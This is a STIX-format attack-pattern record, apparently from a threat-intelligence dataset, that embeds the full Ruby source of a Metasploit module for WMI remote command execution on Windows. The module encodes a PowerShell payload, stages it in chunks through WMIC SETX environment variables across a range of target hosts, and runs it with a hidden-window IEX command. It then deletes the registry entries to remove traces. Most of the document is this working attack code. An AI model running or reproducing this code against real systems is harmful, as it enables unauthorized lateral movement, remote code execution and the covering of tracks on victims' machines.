{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa888e86-4601-468b-b949-559cf012e431",
    "created": "2024-08-14T16:49:58.751603Z",
    "modified": "2024-08-14T16:49:58.751606Z",
    "name": "Windows Management Instrumentation (WMI) Remote Command Execution",
    "description": " This module executes powershell on the remote host using the current user credentials or those supplied. Instead of using PSEXEC over TCP port 445 we use the WMIC command to start a Remote Procedure Call on TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel traffic through that session.  The result is similar to psexec but with the added benefit of using the session's current authentication token instead of having to know a password or hash.  The remote host must be configured to allow remote Windows Management Instrumentation.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/wmi.rb",
            "external_id": "wmi.rb"
        },
        {
            "source_name": "reference",
            "url": "http://passing-the-hash.blogspot.co.uk/2013/07/WMIS-PowerSploit-Shells.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Post::Windows::ExtAPI\n  include Msf::Post::Windows::WMIC\n\n  def initialize(info={})\n    super( update_info( info,\n        'Name'          => 'Windows Management Instrumentation (WMI) Remote Command Execution',\n        'Description'   => %q{\n          This module executes powershell on the remote host using the current\n          user credentials or those supplied. Instead of using PSEXEC over TCP\n          port 445 we use the WMIC command to start a Remote Procedure Call on\n          TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel\n          traffic through that session.\n\n          The result is similar to psexec but with the added benefit of using\n          the session's current authentication token instead of having to know\n          a password or hash.\n\n          The remote host must be configured to allow remote Windows Management\n          Instrumentation.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        => [\n            'Ben Campbell'\n          ],\n        'References'    =>\n          [\n            [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)\n            [ 'OSVDB', '3106'],\n            [ 'URL', 'http://passing-the-hash.blogspot.co.uk/2013/07/WMIS-PowerSploit-Shells.html' ],\n          ],\n        'DefaultOptions' =>\n            {\n                'EXITFUNC' => 'thread',\n                'WfsDelay' => '15',\n            },\n        'DisclosureDate' => '1999-01-01',\n        'Platform'      => [ 'win' ],\n        'SessionTypes'  => [ 'meterpreter' ],\n        'Targets'       =>\n        [\n            [ 'Automatic', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n        ],\n        'DefaultTarget' => 0\n      ))\n\n    register_options([\n      OptAddressRange.new(\"RHOSTS\", [ true, \"Target address range or CIDR identifier\" ]),\n      # Move this out of advanced\n      OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener'])\n    ])\n\n    deregister_options(\"RHOST\")\n  end\n\n  def exploit\n    if datastore['SMBUser'] and datastore['SMBPass'].nil?\n      fail_with(Failure::BadConfig, \"Need both username and password set.\")\n    end\n\n    Rex::Socket::RangeWalker.new(datastore[\"RHOSTS\"]).each do |server|\n      run_host(server)\n    end\n  end\n\n  def run_host(server)\n    if session.extapi\n      psh_options = { :remove_comspec => true,\n                      :encode_final_payload => true }\n    else\n      psh_options = { :remove_comspec => true,\n                      :encode_inner_payload => true,\n                      :wrap_double_quotes => true }\n    end\n\n    psh = cmd_psh_payload(payload.encoded,\n                          payload_instance.arch.first,\n                          psh_options)\n\n    begin\n      if session.extapi\n        exec_cmd = psh\n      else\n        # Get the PSH Payload and split it into bitesize chunks\n        # 1024 appears to be the max value allowed in env vars\n        print_status(\"[#{server}] Storing payload in environment variables\")\n        chunks = split_code(psh, 1000)\n        env_name = rand_text_alpha(rand(3)+3)\n        env_vars = []\n        0.upto(chunks.length-1) do |i|\n          env_vars << \"#{env_name}#{i}\"\n          c = \"cmd /c SETX #{env_vars[i]} \\\"#{chunks[i]}\\\" /m\"\n          result = wmic_command(c, server)\n\n          unless result\n            print_error(\"[#{server}] WMIC command error - skipping host\")\n            return false\n          end\n        end\n\n        x = rand_text_alpha(rand(3)+3)\n        exec_cmd = generate_psh_command_line({\n          :noprofile => true,\n          :windowstyle => 'hidden',\n          :command => \"$#{x}=''\"\n        })\n        env_vars.each do |env|\n          exec_cmd << \"+$env:#{env}\"\n        end\n        exec_cmd << \";IEX $#{x};\"\n      end\n\n      print_status(\"[#{server}] Executing payload\")\n      result = wmic_command(exec_cmd, server)\n\n      if result\n        if result[:return] == 0\n          print_good(\"[#{server}] Process Started PID: #{result[:pid]}\")\n        else\n          print_error(\"[#{server}] failed, Return Value: #{result[:return]})\")\n        end\n      else\n        print_error(\"[#{server}] failed...)\")\n      end\n\n      unless session.extapi\n        print_status(\"[#{server}] Cleaning up environment variables\")\n        env_vars.each do |env|\n          cleanup_cmd = \"cmd /c REG delete \\\"HKLM\\\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment\\\" /V #{env} /f\"\n          wmic_command(cleanup_cmd, server)\n        end\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"[#{server}] Error moving on... #{e}\")\n      return false\n    ensure\n        Rex::sleep(2)\n    end\n  end\n\n  def split_code(psh, chunk_size)\n    array = []\n    idx = 0\n    while (idx < psh.length)\n      array << psh[idx, chunk_size]\n      idx += chunk_size\n    end\n    return array\n  end\nend\n\n",
    "x_mitre_disclosure_date": "1999-01-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}